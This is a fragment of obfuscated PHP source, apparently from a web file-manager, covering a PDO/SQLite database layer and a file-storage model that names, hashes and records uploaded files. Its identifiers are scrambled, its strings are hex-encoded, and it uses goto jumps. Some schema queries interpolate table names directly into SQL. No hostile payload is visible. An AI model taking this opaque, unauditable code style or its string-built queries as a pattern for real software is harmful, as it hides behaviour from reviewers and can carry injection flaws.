$ÄûØ‘ëÇ[$Şá’ëœœ[487]]) { return !1; } return parent::update($»ÎÑ£½, $Ö­½ªú); } public function remove($ ¢…¶îÕ, $³¾ß…Î = false) { $×ù­³Øä =& $_SERVER[‹‰”››ê]; $ò»òÓº¢ = $this->listData($ ¢…¶îÕ); if (!$ò»òÓº¢) { return; } if (!$³¾ß…Î && $ò»òÓº¢[$×ù­³Øä[192]] == $×ù­³Øä[91]) { return !1; } return parent::remove($ ¢…¶îÕ); } public function enable($¢â©Ô‚, $Ù”ùÙü) { return $this->update($¢â©Ô‚, array($_SERVER[‹‰”››ê][2473] => $Ù”ùÙü)); } public function run($ŒÑ±ÚŸŠ) { return $this->update($ŒÑ±ÚŸŠ, array($_SERVER[‹‰”››ê][2485] => time())); } } goto d¨¥­íÕ™Ù; C¡ùÁµ¡ƒ¯: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($·í×ŒØ” = '') { $‰²Ï…Šœ =& $_SERVER[‹‰”››ê]; if (!class_exists($‰²Ï…Šœ[1007])) { think_exception(think_lang($‰²Ï…Šœ[14]) . $‰²Ï…Šœ[1008]); } if (!empty($·í×ŒØ”)) { $this->config = $·í×ŒØ”; if (empty($this->config[$‰²Ï…Šœ[17]])) { $this->config[$‰²Ï…Šœ[17]] = array(); } } } public function connect($ø‘‰ò”° = '', $Ú¡ºë = 0) { $ïğß§ÊŠ =& $_SERVER[‹‰”››ê]; if (!isset($this->linkID[$Ú¡ºë])) { if (empty($ø‘‰ò”°)) { $ø‘‰ò”° = $this->config; } $é‘œÓèÆ = !empty($ø‘‰ò”°[$ïğß§ÊŠ[17]][$ïğß§ÊŠ[18]]) ? $ø‘‰ò”°[$ïğß§ÊŠ[17]][$ïğß§ÊŠ[18]] : $this->pconnect; if ($é‘œÓèÆ) { $ø‘‰ò”°[$ïğß§ÊŠ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ú¡ºë] = new PDO($ø‘‰ò”°[$ïğß§ÊŠ[1009]], $ø‘‰ò”°[$ïğß§ÊŠ[981]], $ø‘‰ò”°[$ïğß§ÊŠ[982]], $ø‘‰ò”°[$ïğß§ÊŠ[17]]); } catch (PDOException $Ô—ŞÑ˜µ) { think_exception($Ô—ŞÑ˜µ->getMessage()); } $this->dbType = $this->_getDsnType($ø‘‰ò”°[$ïğß§ÊŠ[1009]]); if (in_array($this->dbType, array($ïğß§ÊŠ[1010], $ïğß§ÊŠ[1011], $ïğß§ÊŠ[1012], $ïğß§ÊŠ[1013]))) { think_exception($ïğß§ÊŠ[1014] . $this->dbType . $ïğß§ÊŠ[1015] . $this->dbType . $ïğß§ÊŠ[1016]); } if (!$this->linkID[$Ú¡ºë]) { think_exception($ïğß§ÊŠ[1017]); } try { $this->linkID[$Ú¡ºë]->exec($ïğß§ÊŠ[1018] . think_config($ïğß§ÊŠ[984])); } catch (Exception $Ô—ŞÑ˜µ) { } $this->connected = !0; if (1 != think_config($ïğß§ÊŠ[22])) { unset($this->config); } } return $this->linkID[$Ú¡ºë]; } public function free() { $this->PDOStatement = null; } public function query($ëâî¬¯, $×üšÛøı = array()) { $ºƒÇ¶« =& $_SERVER[‹‰”››ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ëâî¬¯; if (!empty($×üšÛøı)) { $this->queryStr .= $ºƒÇ¶«[1019] . print_r($×üšÛøı, !0) . $ºƒÇ¶«[1020]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ºƒÇ¶«[23], 1); think_status($ºƒÇ¶«[24]); $this->PDOStatement = $this->_linkID->prepare($ëâî¬¯); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¹ÆˆşŞç = $this->PDOStatement->execute($×üšÛøı); $this->debug(); if (!1 === $¹ÆˆşŞç) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($²Øó­¬Í, $½’¤¸ôÛ = array()) { $ƒß½Í­¤ =& $_SERVER[‹‰”››ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $²Øó­¬Í; if (!empty($½’¤¸ôÛ)) { $this->queryStr .= $ƒß½Í­¤[1019] . print_r($½’¤¸ôÛ, !0) . $ƒß½Í­¤[1020]; } $¦’ª«Ğ = !1; if ($this->dbType == $ƒß½Í­¤[1013]) { if (preg_match($ƒß½Í­¤[1021], $this->queryStr, $âºò¸“”)) { $this->table = think_config($ƒß½Í­¤[1022]) . str_ireplace(think_config($ƒß½Í­¤[1023]), $ƒß½Í­¤[466], $âºò¸“”[2]); $¦’ª«Ğ = (bool) $this->query($ƒß½Í­¤[1024] . strtoupper($this->table) . $ƒß½Í­¤[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ƒß½Í­¤[25], 1); think_status($ƒß½Í­¤[24]); $this->PDOStatement = $this->_linkID->prepare($²Øó­¬Í); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Œ¡šåòğ = $this->PDOStatement->execute($½’¤¸ôÛ); $this->debug(); if (!1 === $Œ¡šåòğ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¦’ª«Ğ || preg_match($ƒß½Í­¤[1025], $²Øó­¬Í)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˜¶…Ïƒ‡ = $this->_linkID->commit(); $this->transTimes = 0; if (!$˜¶…Ïƒ‡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $·ÕœÆ¬ú = $this->_linkID->rollback(); $this->transTimes = 0; if (!$·ÕœÆ¬ú) { $this->error(); return !1; } } return !0; } private function getAll() { $¬û·ÕÍÔ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¬û·ÕÍÔ); return $¬û·ÕÍÔ; } public function getFields($Î»Æ»Ò‰) { $«ùúŠö =& $_SERVER[‹‰”››ê]; $this->initConnect(!0); if (think_config($«ùúŠö[1026])) { $Ùš•¡½… = str_replace($«ùúŠö[1027], $Î»Æ»Ò‰, think_config($«ùúŠö[1026])); } else { switch ($this->dbType) { case $«ùúŠö[1010]: case $«ùúŠö[1028]: $Ùš•¡½… = "\123\105\114\105\x43\124\40\x20\40\x63\x6f\x6c\165\155\156\x5f\x6e\x61\155\x65\x20\x61\x73\x20\47\x4e\x61\x6d\x65\47\54\x20\x20\x20\144\141\164\x61\x5f\164\x79\x70\x65\40\x61\x73\40\47\x54\171\160\x65\47\x2c\x20\x20\x20\x63\x6f\x6c\165\x6d\156\137\144\145\146\141\x75\x6c\x74\40\x61\x73\x20\x27\104\x65\146\141\x75\x6c\x74\47\x2c\40\x20\x20\151\163\137\x6e\x75\154\154\x61\x62\x6c\x65\40\141\x73\40\47\116\165\154\154\47\xa\x9\11\x46\122\x4f\x4d\11\151\x6e\x66\157\162\x6d\x61\x74\151\157\156\x5f\x73\143\150\145\x6d\x61\x2e\x74\x61\x62\x6c\145\x73\40\x41\123\x20\164\12\11\11\112\x4f\111\116\11\x69\x6e\x66\157\162\x6d\x61\x74\151\x6f\156\x5f\163\143\150\145\155\141\56\x63\157\154\x75\155\x6e\163\x20\101\x53\x20\143\12\11\x9\x4f\x4e\x20\x20\164\56\164\141\142\x6c\x65\137\x63\x61\164\141\154\157\147\x20\x3d\x20\x63\x2e\164\141\x62\x6c\x65\x5f\x63\x61\x74\x61\x6c\157\147\xa\11\11\101\116\x44\x20\164\x2e\x74\x61\x62\x6c\x65\x5f\x73\143\x68\145\155\141\x20\75\x20\143\56\x74\141\142\154\145\x5f\163\143\x68\145\x6d\x61\12\x9\x9\101\116\104\x20\164\56\x74\x61\142\x6c\x65\x5f\156\141\155\145\40\x3d\x20\143\56\x74\141\x62\154\x65\x5f\x6e\x61\x6d\145\12\11\x9\x57\x48\x45\x52\105\40\40\40\x74\56\164\141\x62\154\x65\137\x6e\141\x6d\145\40\75\40\x27{$Î»Æ»Ò‰}\x27"; break; case $«ùúŠö[1029]: $Ùš•¡½… = $«ùúŠö[1030] . $Î»Æ»Ò‰ . $«ùúŠö[1031]; break; case $«ùúŠö[1011]: case $«ùúŠö[1013]: $Ùš•¡½… = $«ùúŠö[1032] . $«ùúŠö[1033] . $«ùúŠö[1034] . strtoupper($Î»Æ»Ò‰) . $«ùúŠö[1035] . strtoupper($Î»Æ»Ò‰) . $«ùúŠö[1036]; break; case $«ùúŠö[1037]: $Ùš•¡½… = $«ùúŠö[1038] . $Î»Æ»Ò‰ . $«ùúŠö[1039]; break; case $«ùúŠö[1012]: break; case $«ùúŠö[1040]: default: $Ùš•¡½… = $«ùúŠö[1041] . ($this->dbType == $«ùúŠö[1040] ? "\140{$Î»Æ»Ò‰}\x60" : $Î»Æ»Ò‰); } } $ÌÆ‹¥Ì = $this->query($Ùš•¡½…); $íöâú¯á = array(); if ($ÌÆ‹¥Ì) { foreach ($ÌÆ‹¥Ì as $ãÄì Ó£ => $Û¢´ùµÉ) { $Û¢´ùµÉ = array_change_key_case($Û¢´ùµÉ); $Û¢´ùµÉ[$«ùúŠö[32]] = isset($Û¢´ùµÉ[$«ùúŠö[32]]) ? $Û¢´ùµÉ[$«ùúŠö[32]] : $«ùúŠö[466]; $Û¢´ùµÉ[$«ùúŠö[33]] = isset($Û¢´ùµÉ[$«ùúŠö[33]]) ? $Û¢´ùµÉ[$«ùúŠö[33]] : $«ùúŠö[466]; $ø­ô’ºÛ = isset($Û¢´ùµÉ[$«ùúŠö[362]]) ? $Û¢´ùµÉ[$«ùúŠö[362]] : $Û¢´ùµÉ[$«ùúŠö[32]]; $íöâú¯á[$ø­ô’ºÛ] = array($«ùúŠö[32] => $ø­ô’ºÛ, $«ùúŠö[33] => $Û¢´ùµÉ[$«ùúŠö[33]], $«ùúŠö[35] => (bool) (isset($Û¢´ùµÉ[$«ùúŠö[106]]) && $Û¢´ùµÉ[$«ùúŠö[106]] === $«ùúŠö[12] || isset($Û¢´ùµÉ[$«ùúŠö[35]]) && $Û¢´ùµÉ[$«ùúŠö[35]] === $«ùúŠö[12]), $«ùúŠö[37] => isset($Û¢´ùµÉ[$«ùúŠö[37]]) ? $Û¢´ùµÉ[$«ùúŠö[37]] : (isset($Û¢´ùµÉ[$«ùúŠö[56]]) ? $Û¢´ùµÉ[$«ùúŠö[56]] : $«ùúŠö[466]), $«ùúŠö[39] => isset($Û¢´ùµÉ[$«ùúŠö[97]]) ? strtolower($Û¢´ùµÉ[$«ùúŠö[97]]) == $«ùúŠö[41] : (isset($Û¢´ùµÉ[$«ùúŠö[57]]) ? $Û¢´ùµÉ[$«ùúŠö[57]] : !1), $«ùúŠö[42] => isset($Û¢´ùµÉ[$«ùúŠö[1042]]) ? strtolower($Û¢´ùµÉ[$«ùúŠö[1042]]) == $«ùúŠö[44] : (isset($Û¢´ùµÉ[$«ùúŠö[97]]) ? $Û¢´ùµÉ[$«ùúŠö[97]] : !1)); } } return $íöâú¯á; } public function getTables($áèš¾¬ = '') { $íüĞ‚ºç =& $_SERVER[‹‰”››ê]; if (think_config($íüĞ‚ºç[1043])) { $À¨À‘œ“ = str_replace($íüĞ‚ºç[1044], $áèš¾¬, think_config($íüĞ‚ºç[1043])); } else { switch ($this->dbType) { case $íüĞ‚ºç[1011]: case $íüĞ‚ºç[1013]: $À¨À‘œ“ = $íüĞ‚ºç[1045]; break; case $íüĞ‚ºç[1010]: case $íüĞ‚ºç[1028]: $À¨À‘œ“ = $íüĞ‚ºç[1046]; break; case $íüĞ‚ºç[1037]: $À¨À‘œ“ = $íüĞ‚ºç[1047]; break; case $íüĞ‚ºç[1012]: think_exception(think_lang($íüĞ‚ºç[1048]) . $íüĞ‚ºç[1049]); break; case $íüĞ‚ºç[1029]: $À¨À‘œ“ = $íüĞ‚ºç[45] . $íüĞ‚ºç[46] . $íüĞ‚ºç[47]; break; case $íüĞ‚ºç[1040]: default: if (!empty($áèš¾¬)) { $À¨À‘œ“ = $íüĞ‚ºç[992] . $áèš¾¬ . $íüĞ‚ºç[993]; } else { $À¨À‘œ“ = $íüĞ‚ºç[994]; } } } $šÍÑ²Î’ = $this->query($À¨À‘œ“); $æ¾Şû½ê = array(); foreach ($šÍÑ²Î’ as $ÑİùàÙø => $€Úø×Ó™) { $æ¾Şû½ê[$ÑİùàÙø] = current($€Úø×Ó™); } return $æ¾Şû½ê; } protected function parseLimit($åš’“×µ) { $‘ˆ¯ô“† =& $_SERVER[‹‰”››ê]; $¸„æ¦•¨ = $‘ˆ¯ô“†[12]; if (!empty($åš’“×µ)) { switch ($this->dbType) { case $‘ˆ¯ô“†[1037]: case $‘ˆ¯ô“†[1029]: $åš’“×µ = explode($‘ˆ¯ô“†[50], $åš’“×µ); if (count($åš’“×µ) > 1) { $¸„æ¦•¨ .= $‘ˆ¯ô“†[51] . $åš’“×µ[1] . $‘ˆ¯ô“†[52] . $åš’“×µ[0] . $‘ˆ¯ô“†[53]; } else { $¸„æ¦•¨ .= $‘ˆ¯ô“†[51] . $åš’“×µ[0] . $‘ˆ¯ô“†[53]; } break; case $‘ˆ¯ô“†[1010]: case $‘ˆ¯ô“†[1028]: break; case $‘ˆ¯ô“†[1012]: break; case $‘ˆ¯ô“†[1011]: case $‘ˆ¯ô“†[1013]: break; case $‘ˆ¯ô“†[1040]: default: $¸„æ¦•¨ .= $‘ˆ¯ô“†[51] . $åš’“×µ . $‘ˆ¯ô“†[53]; } } return $¸„æ¦•¨; } public function parseKey(&$¿Š‘©´ğ, $”˜îÇ“† = true) { $‚Ç‚Å¥â =& $_SERVER[‹‰”››ê]; if ($”˜îÇ“†) { $¿Š‘©´ğ = $this->parseKeyCheck($¿Š‘©´ğ); } if ($this->dbType == $‚Ç‚Å¥â[1040]) { if ($¿Š‘©´ğ != $‚Ç‚Å¥â[223] && !preg_match($‚Ç‚Å¥â[1004], $¿Š‘©´ğ)) { $¿Š‘©´ğ = $‚Ç‚Å¥â[473] . trim($¿Š‘©´ğ, $‚Ç‚Å¥â[473]) . $‚Ç‚Å¥â[473]; } return $¿Š‘©´ğ; } else { return parent::parseKey($¿Š‘©´ğ, $”˜îÇ“†); } } public function close() { $this->_linkID = null; } public function error() { $¢¡œ¯² =& $_SERVER[‹‰”››ê]; if ($this->PDOStatement) { $éÜâì‚¡ = $this->PDOStatement->errorInfo(); $this->error = $éÜâì‚¡[1] . $¢¡œ¯²[4] . $éÜâì‚¡[2]; } else { $this->error = $¢¡œ¯²[12]; } if ($¢¡œ¯²[12] != $this->queryStr) { $this->error .= LNG($¢¡œ¯²[48]) . $this->queryStr; } think_trace($this->error, $¢¡œ¯²[12], $¢¡œ¯²[49]); return $this->error; } public function escapeString($ô·¼ÃÜÅ) { $¯îá›Êß =& $_SERVER[‹‰”››ê]; switch ($this->dbType) { case $¯îá›Êß[1037]: case $¯îá›Êß[1010]: case $¯îá›Êß[1028]: case $¯îá›Êß[1040]: return addslashes($ô·¼ÃÜÅ); case $¯îá›Êß[1012]: case $¯îá›Êß[1029]: case $¯îá›Êß[1011]: case $¯îá›Êß[1013]: return str_ireplace($¯îá›Êß[58], $¯îá›Êß[59], $ô·¼ÃÜÅ); } } protected function parseValue($ã¿¹Ÿ–ü) { $Ó¥ó²‡û =& $_SERVER[‹‰”››ê]; if (is_string($ã¿¹Ÿ–ü)) { $Çæø¬›º = strpos($ã¿¹Ÿ–ü, $Ó¥ó²‡û[4]) === 0 && in_array($ã¿¹Ÿ–ü, array_keys($this->bind)); $ã¿¹Ÿ–ü = $Çæø¬›º ? $this->escapeString($ã¿¹Ÿ–ü) : $Ó¥ó²‡û[1050] . $this->escapeString($ã¿¹Ÿ–ü) . $Ó¥ó²‡û[1050]; } elseif (isset($ã¿¹Ÿ–ü[0]) && is_string($ã¿¹Ÿ–ü[0]) && strtolower($ã¿¹Ÿ–ü[0]) == $Ó¥ó²‡û[384]) { $ã¿¹Ÿ–ü = $this->escapeString($ã¿¹Ÿ–ü[1]); } elseif (is_array($ã¿¹Ÿ–ü)) { $ã¿¹Ÿ–ü = array_map(array($this, $Ó¥ó²‡û[1051]), $ã¿¹Ÿ–ü); } elseif (is_bool($ã¿¹Ÿ–ü)) { $ã¿¹Ÿ–ü = $ã¿¹Ÿ–ü ? $Ó¥ó²‡û[91] : $Ó¥ó²‡û[231]; } elseif (is_null($ã¿¹Ÿ–ü)) { $ã¿¹Ÿ–ü = $Ó¥ó²‡û[106]; } return $ã¿¹Ÿ–ü; } public function getLastInsertId() { $âÊ‹†º« =& $_SERVER[‹‰”››ê]; switch ($this->dbType) { case $âÊ‹†º«[1037]: case $âÊ‹†º«[1029]: case $âÊ‹†º«[1010]: case $âÊ‹†º«[1028]: case $âÊ‹†º«[1012]: case $âÊ‹†º«[1040]: return $this->_linkID->lastInsertId(); case $âÊ‹†º«[1011]: case $âÊ‹†º«[1013]: $Û“Ã§Ãğ = $this->table; $¥Í®€ÅÌ = $this->query("\x53\x45\x4c\105\x43\x54\x20{$Û“Ã§Ãğ}\56\143\x75\x72\x72\166\141\154\x20\143\165\x72\x72\166\x61\154\x20\x46\x52\x4f\x4d\x20\144\165\141\x6c"); return $¥Í®€ÅÌ ? $¥Í®€ÅÌ[0][$âÊ‹†º«[1052]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($²º£Ñ¾Ù) { $ƒ ¯¨ßö =& $_SERVER[‹‰”››ê]; if (!CacheLock::fileLock($ƒ ¯¨ßö[13])) { return !1; } $ƒ®†É½£ = parent::query($²º£Ñ¾Ù); CacheLock::fileUnLock($ƒ ¯¨ßö[13]); return $ƒ®†É½£; } public function execute($Ñâ¿´Ã™) { $¦€Å’±µ =& $_SERVER[‹‰”››ê]; if (!CacheLock::fileLock($¦€Å’±µ[13])) { return !1; } $û¼ğÒ‘ = parent::execute($Ñâ¿´Ã™); CacheLock::fileUnLock($¦€Å’±µ[13]); return $û¼ğÒ‘; } } class DbSqlite3 extends DbSqlite3Base { public function query($ç”·Ø™) { $¨ÜÛõ„ =& $_SERVER[‹‰”››ê]; if (!CacheLock::fileLock($¨ÜÛõ„[13])) { return !1; } $†¯Óâ«å = parent::query($ç”·Ø™); CacheLock::fileUnLock($¨ÜÛõ„[13]); return $†¯Óâ«å; } public function execute($Éõ¿‡Œ‹) { $‚“éÙ Ü =& $_SERVER[‹‰”››ê]; if (!CacheLock::fileLock($‚“éÙ Ü[13])) { return !1; } $‡¶–€¾Ë = parent::execute($Éõ¿‡Œ‹); CacheLock::fileUnLock($‚“éÙ Ü[13]); return $‡¶–€¾Ë; } } goto c—˜–È°Í¥; CÒ‹‹–¼™°: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\x6d\x65" => "\x69\x6f\x5f\146\x69\x6c\145\137\x6d\145\x74\141", "\x6d\145\164\141\106\x69\x65\x6c\x64" => "\x66\151\154\x65\x49\104"); public function fileInfo($Ğ¦ÁÉ©ä) { $ÛŞñ²‰ =& $_SERVER[‹‰”››ê]; static $ ÛŸÏî½ = array(); if (!isset($ ÛŸÏî½[$Ğ¦ÁÉ©ä])) { $ã—ë«ö¼ = $ÛŞñ²‰[2042]; $ÊçâÂ¿İ = Model($ÛŞñ²‰[558])->field($ã—ë«ö¼)->where(array($ÛŞñ²‰[556] => $Ğ¦ÁÉ©ä))->find(); $ ÛŸÏî½[$Ğ¦ÁÉ©ä] = $ÊçâÂ¿İ; } return $ ÛŸÏî½[$Ğ¦ÁÉ©ä]; } public function addFileByContent($âå°´Î = '', $¤Šà‹– = '') { $ğ–¯üü³ =& $_SERVER[‹‰”››ê]; $ØœÇÄÑœ = TEMP_PATH . $ğ–¯üü³[2043]; if (!is_dir($ØœÇÄÑœ)) { mk_dir($ØœÇÄÑœ); } $øú…Àˆù = $ØœÇÄÑœ . $ğ–¯üü³[2044] . rand_string(16); $€ªŠÍÏ½ = file_put_contents($øú…Àˆù, $âå°´Î); if ($€ªŠÍÏ½ === !1 || strlen($âå°´Î) != $€ªŠÍÏ½) { return !1; } $Ë÷ãĞ¼Ş = $this->addFile($øú…Àˆù, $¤Šà‹–, !0); if (file_exists($øú…Àˆù)) { @unlink($øú…Àˆù); } return $Ë÷ãĞ¼Ş; } public function createFileName($àÚ†Ã‚Š, $È ê²Óö = false, $ŞîÙ±Åü = false) { $’”ÙÚî¯ =& $_SERVER[‹‰”››ê]; $ßŒ‹½ôˆ = IO::init($’”ÙÚî¯[8]); $ôôÏÙÆ€ = $this->makeFilePath($àÚ†Ã‚Š, $ßŒ‹½ôˆ, $È ê²Óö, $ŞîÙ±Åü); $íô‡ÔĞ³ = $ßŒ‹½ôˆ->pathFather($ôôÏÙÆ€); static $Ëâ»Œ‹š = false; $¬¡ÀˆûŸ = $’”ÙÚî¯[2045] . md5($íô‡ÔĞ³); if (!$Ëâ»Œ‹š && !Cache::get($¬¡ÀˆûŸ)) { $Ëâ»Œ‹š = !0; $©ÛÌéÈ = IO::mkdir($íô‡ÔĞ³); if (!IO::exist($©ÛÌéÈ . $’”ÙÚî¯[889])) { IO::mkfile($©ÛÌéÈ . $’”ÙÚî¯[889]); } Cache::set($¬¡ÀˆûŸ, 1, 3600 * 2); } return $ôôÏÙÆ€; } public function makeFilePath($†ŞìÉ, $Íï¤½Ô, $òŞô¡ôµ = false, $ºèº¡ŒÈ = false) { $ÓêŒ˜Ğ– =& $_SERVER[‹‰”››ê]; $˜‡ ıêÆ = Model($ÓêŒ˜Ğ–[860])->get($ÓêŒ˜Ğ–[2046]); $ñÁ¦öü = KodIO::defaultIO() . date($ÓêŒ˜Ğ–[2047]); $¨¯©¬œ = $ñÁ¦öü . rand_string(5) . short_id(100); $†ŞìÉ = str_replace($ÓêŒ˜Ğ–[8], $ÓêŒ˜Ğ–[11], KodIO::clear($†ŞìÉ)); $¼¤æÏØ = $Íï¤½Ô->ext($†ŞìÉ); if (!$†ŞìÉ) { $˜‡ ıêÆ = $ÓêŒ˜Ğ–[866]; } switch ($˜‡ ıêÆ) { case $ÓêŒ˜Ğ–[2048]: if ($¼¤æÏØ) { $¨¯©¬œ = $¨¯©¬œ . $ÓêŒ˜Ğ–[10] . $¼¤æÏØ; } if ($¼¤æÏØ == $ÓêŒ˜Ğ–[1984]) { $¨¯©¬œ .= $ÓêŒ˜Ğ–[1307]; } break; case $ÓêŒ˜Ğ–[2049]: $¹›…ÆÌ• = Model($ÓêŒ˜Ğ–[860])->get($ÓêŒ˜Ğ–[861]); $¤ÅÃ¦íü = substr(md5($ÓêŒ˜Ğ–[862] . $¹›…ÆÌ• . date($ÓêŒ˜Ğ–[839])), 0, 8); $İÀ¯Ù = KodIO::defaultDriver(); $ñÁ¦öü = $ÓêŒ˜Ğ–[1338] . $İÀ¯Ù[$ÓêŒ˜Ğ–[487]] . $ÓêŒ˜Ğ–[496] . date($ÓêŒ˜Ğ–[2050]) . $¤ÅÃ¦íü . $ÓêŒ˜Ğ–[8]; if ($¼¤æÏØ == $ÓêŒ˜Ğ–[1984]) { $†ŞìÉ .= $ÓêŒ˜Ğ–[1307]; } $Œà€­İ¹ = $ÓêŒ˜Ğ–[2051] . $ñÁ¦öü . $†ŞìÉ; CacheLock::lock($Œà€­İ¹); $¨¯©¬œ = $ñÁ¦öü . $†ŞìÉ; if (IO::exist($ñÁ¦öü . $†ŞìÉ)) { $¹š—¦–Ë = substr($†ŞìÉ, 0, strlen($†ŞìÉ) - strlen($¼¤æÏØ)); $îÀ®øß‰ = $ºèº¡ŒÈ ? substr($ºèº¡ŒÈ, 0, 5) : ($òŞô¡ôµ ? substr($òŞô¡ôµ, 0, 5) : rand_string(5)); $¨¯©¬œ = $ñÁ¦öü . $¹š—¦–Ë . $îÀ®øß‰; if ($¼¤æÏØ) { $¨¯©¬œ = $¨¯©¬œ . $ÓêŒ˜Ğ–[10] . $¼¤æÏØ; } } if (IO::isOsDriver($¨¯©¬œ) && !IO::isUploadServer($¨¯©¬œ)) { if (IO::exist($¨¯©¬œ)) { CacheLock::unlock($Œà€­İ¹); return $¨¯©¬œ; } $Øì’ôÍ˜ = IO::setContent($¨¯©¬œ, $ÓêŒ˜Ğ–[12]); if (!$Øì’ôÍ˜) { show_json($ÓêŒ˜Ğ–[2052], !1); } } CacheLock::unlock($Œà€­İ¹); break; case $ÓêŒ˜Ğ–[866]: break; default: break; } return $¨¯©¬œ; } public function addFileByRemote($º”İóÏ“, $Ë€éÄ€¤, $¡ÅäÓ‹Ê = array()) { $•šÁÈ°ø =& $_SERVER[‹‰”››ê]; if (!IO::exist($º”İóÏ“)) { return !1; } $–¢“¨í‘ = $¡ÅäÓ‹Ê[$•šÁÈ°ø[561]] ? $¡ÅäÓ‹Ê[$•šÁÈ°ø[561]] : $•šÁÈ°ø[12]; $í‹çßÛ = IO::hashMd5($º”İóÏ“, $–¢“¨í‘); $ûçĞ±Ïº = KodIO::defaultDriver(); $ş»Ãëî  = array($•šÁÈ°ø[634] => IO::size($º”İóÏ“), $•šÁÈ°ø[2053] => 1, $•šÁÈ°ø[506] => $Ë€éÄ€¤, $•šÁÈ°ø[903] => $ûçĞ±Ïº[$•šÁÈ°ø[487]], $•šÁÈ°ø[507] => $º”İóÏ“, $•šÁÈ°ø[2054] => $¡ÅäÓ‹Ê[$•šÁÈ°ø[689]] ? $¡ÅäÓ‹Ê[$•šÁÈ°ø[689]] : IO::hashSimple($º”İóÏ“), $•šÁÈ°ø[2055] => $í‹çßÛ ? $í‹çßÛ : $–¢“¨í‘); if ($¿¢ïØ×ù = $this->addFileCheckExist($ş»Ãëî [$•šÁÈ°ø[689]], $ş»Ãëî [$•šÁÈ°ø[561]], $ş»Ãëî [$•šÁÈ°ø[79]])) { return $¿¢ïØ×ù; } return $this->addFileData($ş»Ãëî ); } private function addFileData($™ãÏë¦ı) { $ßÇºË¯ê =& $_SERVER[‹‰”››ê]; if (!$™ãÏë¦ı) { return !1; } $™ãÏë¦ı[$ßÇºË¯ê[79]] = intval($™ãÏë¦ı[$ßÇºË¯ê[79]]); if (!$™ãÏë¦ı[$ßÇºË¯ê[79]] && strlen($™ãÏë¦ı[$ßÇºË¯ê[689]]) > 32) { $™ãÏë¦ı[$ßÇºË¯ê[79]] = intval(substr($™ãÏë¦ı[$ßÇºË¯ê[689]], 32)); } $Œ¹²¸ı = $this->add($™ãÏë¦ı); return $this->find($Œ¹²¸ı); } public function addFile($¡Òİæ»Š, $ÆûÃ¼®, $Çšğê¦ï = false) { $‹ÑÇ–† =& $_SERVER[‹‰”››ê]; $È¿‰æ‹ = IO::hashSimple($¡Òİæ»Š); $šÖÓ½À˜ = IO::size($¡Òİæ»Š); $³áŠÂ¨‡ = $šÖÓ½À˜ <= 1024 * 1024 * 10 ? IO::hashMd5($¡Òİæ»Š) : $‹ÑÇ–†[12]; $†¢“Œ¡­ = $‹ÑÇ–†[2056] . $È¿‰æ‹; CacheLock::lock($†¢“Œ¡­); if ($³áŠÂ¨‡ && $È¿‰æ‹) { $ÓÃ–ıš = $this->addFileCheckExist($È¿‰æ‹, $³áŠÂ¨‡, $šÖÓ½À˜); if ($ÓÃ–ıš) { CacheLock::unlock($†¢“Œ¡­); return $ÓÃ–ıš; } } $à³­şÜ = $this->addFileMake($¡Òİæ»Š, $šÖÓ½À˜, $È¿‰æ‹, $³áŠÂ¨‡, $ÆûÃ¼®, $Çšğê¦ï); $¿‡˜ûåĞ = $this->addFileData($à³­şÜ); if (!$¿‡˜ûåĞ) { return !1; } CacheLock::unlock($†¢“Œ¡­); if (!$³áŠÂ¨‡ && $¿‡˜ûåĞ) { $this->fileMd5Check($¿‡˜ûåĞ); } return $¿‡˜ûåĞ; } public function fileMd5Check($üËú´Î½) { $ˆ˜„¨œâ =& $_SERVER[‹‰”››ê]; $·»ˆ™¡Í = array($üËú´Î½[$ˆ˜„¨œâ[555]], $üËú´Î½[$ˆ˜„¨œâ[87]]); $ŸãşŠŸË = $ˆ˜„¨œâ[2057] . $üËú´Î½[$ˆ˜„¨œâ[87]]; $…Ö¾’¨° = $ˆ˜„¨œâ[2058] . $üËú´Î½[$ˆ˜„¨œâ[555]]; TaskQueue::add($ˆ˜„¨œâ[2059], $·»ˆ™¡Í, $ŸãşŠŸË, $…Ö¾’¨°); } public function fileMd5Set($”âñ˜¿, $÷ï¾ƒ÷‘) { $ŠÍİñšÓ =& $_SERVER[‹‰”››ê]; $Ü¨ï¶Ïü = $this->find($”âñ˜¿); if (!$Ü¨ï¶Ïü || $Ü¨ï¶Ïü[$ŠÍİñšÓ[561]]) { return; } $†Å‘íÁ© = IO::hashMd5($÷ï¾ƒ÷‘); if (!$†Å‘íÁ©) { return $ŠÍİñšÓ[12]; } $this->where(array($ŠÍİñšÓ[555] => $”âñ˜¿))->save(array($ŠÍİñšÓ[561] => $†Å‘íÁ©)); } public function addFileMake($„†à‘Àü, $‰¦²¾ò–, $ùÀÍêöÕ, $İó÷Õ, $ª÷ßŞÇ², $óÀ­ô) { $Õªç¾£ =& $_SERVER[‹‰”››ê]; $Ü¹¡Ë³ = $this->createFileName($ª÷ßŞÇ², $ùÀÍêöÕ, $İó÷Õ); $ù«š¶î¢ = get_path_father($Ü¹¡Ë³); $½Å¾ÃĞĞ = get_path_this($Ü¹¡Ë³); if ($óÀ­ô) { $•°Ùäõş = IO::move($„†à‘Àü, $ù«š¶î¢, !1, $½Å¾ÃĞĞ); } else { $•°Ùäõş = IO::copy($„†à‘Àü, $ù«š¶î¢, !1, $½Å¾ÃĞĞ); } if (!$•°Ùäõş) { return !1; } $á³Ö¯äª = IO::init($•°Ùäõş); 